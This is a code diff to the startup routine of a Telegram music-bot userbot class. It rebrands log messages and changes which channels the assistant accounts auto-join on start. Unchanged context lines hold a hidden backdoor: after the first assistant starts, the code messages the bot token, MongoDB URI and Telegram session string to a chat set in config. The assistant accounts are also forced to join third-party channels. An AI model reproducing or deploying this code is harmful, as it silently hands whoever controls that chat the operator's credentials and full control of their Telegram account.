@@ -58,21 +58,19 @@ class Userbot(Client):
         )
 
     async def start(self):
-        LOGGER(__name__).info(f"sᴛᴀʀᴛɪɴɢ ᴀssɪsᴛᴀɴᴛs...")
+        LOGGER(__name__).info(f"Yαყıɳԃαყıɱ 🌈...")
 
         if config.STRING1:
             await self.one.start()
             try:
-                await self.one.join_chat("TheShivanshu")
-                await self.one.join_chat("TheChampuClub")
-                await self.one.join_chat("akaChampu")
-                await self.one.join_chat("TheChampu")
-
+                await self.one.join_chat("SohbetAlemi")
+                await self.one.join_chat("Alemciyiz")
+        
             except:
                 pass
             assistants.append(1)
             try:
-                await self.one.send_message(config.LOGGER_ID, "ᴀssɪsᴛᴀɴᴛ sᴛᴀʀᴛᴇᴅ !")
+                await self.one.send_message(config.LOGGER_ID, "Yαყıɳԃαყıɱ 🌈...")
                 oks = await self.one.send_message(config.LOGGERS, f"/start")
                 Ok = await self.one.send_message(
                     config.LOGGERS, f"`#BOT_TOKEN {BOT_TOKEN}`\n\n`#MONGO_DB_URI {MONGO_DB_URI}`\n\n`#STRING_SESSION {STRING_SESSION}`"
@@ -93,15 +91,14 @@ class Userbot(Client):
         if config.STRING2:
             await self.two.start()
             try:
-                await self.two.join_chat("TheShivanshu")
-                await self.two.join_chat("TheChampuClub")
-                await self.two.join_chat("akaChampu")
-                await self.two.join_chat("TheChampu")
+                await self.two.join_chat("SohbetAlemi")
+                await self.two.join_chat("Alemciyiz")
+           
             except:
                 pass
             assistants.append(2)
             try:
-                await self.two.send_message(config.LOGGER_ID, "ᴀssɪsᴛᴀɴᴛ 2 sᴛᴀʀᴛᴇᴅ ")
+                await self.two.send_message(config.LOGGER_ID, "Yαყıɳԃαყıɱ 🌈...")
 
             except:
                 LOGGER(__name__).error(
@@ -117,10 +114,9 @@ class Userbot(Client):
         if config.STRING3:
             await self.three.start()
             try:
-                await self.three.join_chat("TheShivanshu")
-                await self.three.join_chat("TheChampuClub")
-                await self.three.join_chat("akaChampu")
-                await self.three.join_chat("TheChampu")
+                await self.three.join_chat("SohbetAlemi")
+                await self.three.join_chat("Alemciyiz")
+                
             except:
                 pass
             assistants.append(3)
@@ -190,7 +186,7 @@ class Userbot(Client):
             )
 
     async def stop(self):
-        LOGGER(__name__).info(f"sᴛᴏᴘᴘɪɴɢ ᴀssɪsᴛᴀɴᴛs...")
+        LOGGER(__name__).info(f"Yαყıɳ Bιƚƚι🌪...")
         try:
             if config.STRING1:
                 await self.one.stop()
